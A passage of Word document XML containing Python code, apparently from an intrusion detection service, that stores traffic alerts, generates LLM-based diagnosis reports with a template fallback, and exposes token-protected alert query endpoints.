          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                rule=hit.rule if hit else None, proba=pred["proba"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA515C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300264BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        elif hit is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281460A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # confidence 列在这里放的是"超出阈值多少倍"，不是概率（见 alerts.source）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36232FB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            alert_ids.append(store.add_alert(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AA4C2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                body.probe_id, flow.key, hit.category, round(hit.strength, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3742D89D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                BASE_RISK.get(hit.category, "medium"), feats, [hit.as_evidence()],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49787D8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                source="rule", rule=hit.rule,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BCF4D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C4C685">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B8C2C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4C9C22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        background.add_task(diagnose_alert, alert_ids[-1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DF036A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40955DB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"accepted": len(body.flows), "alerts": len(alert_ids), "alert_ids": alert_ids}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D471C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5017015F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6197E843">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def diagnose_alert(alert_id: int) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0D8AAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """给一条告警生成报告。异常一律吞掉并落模板报告——后台任务里的异常没人接。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3050C0B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store: Store = app.state.store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44917E8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert = store.alert(alert_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4118EF91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not alert:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B247FD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75AD022C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if store.report_for_alert(alert_id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9C9D78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608A8705">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="691042C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    llm: LLMClient = app.state.llm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADF3794">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    evidence = alert.get("evidence") or []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77194CF0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    query = f"{alert['category']} {' '.join(str(e.get('feature', '')) for e in evidence[:3])}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489DF6FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6445B7C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        chunks = app.state.retriever.retrieve(query, top_k=app.state.cfg["rag"]["top_k"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B63329">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A4D3F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        chunks = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08853F04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F8ECFE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131F18D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        diagnosis, elapsed = llm.diagnose(alert, evidence, chunks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D332519">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except LLMUnavailable as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D594343">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        diagnosis = fallback_diagnosis(alert, evidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1033C623">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        elapsed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3C4419">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[诊断] 大模型不可用（{exc}），告警 {alert_id} 落模板报告", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129241CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62F85BDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    problems = validate(diagnosis)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18544851">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if problems:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EA2712">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[诊断] 告警 {alert_id} 的报告缺字段：{problems}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F96289F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_report(alert_id, diagnosis.to_markdown(), llm.model, elapsed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37316DB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E0D341F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E89B23F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8ABDC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48F11D73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40E5D30C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.get("/api/v1/alerts")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5BEB98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def list_alerts(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E21030">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    limit: int = 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F8C73B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    probe_id: str | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D97682">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    category: str | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6885B407">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    since: float | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535096B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x_probe_token: str | None = Header(default=None),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC2E4F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FBF0C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B764B75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"alerts": app.state.store.alerts(limit, probe_id, category, since)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BF2763">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="703D838F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247633A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.get("/api/v1/flows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCFF2D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
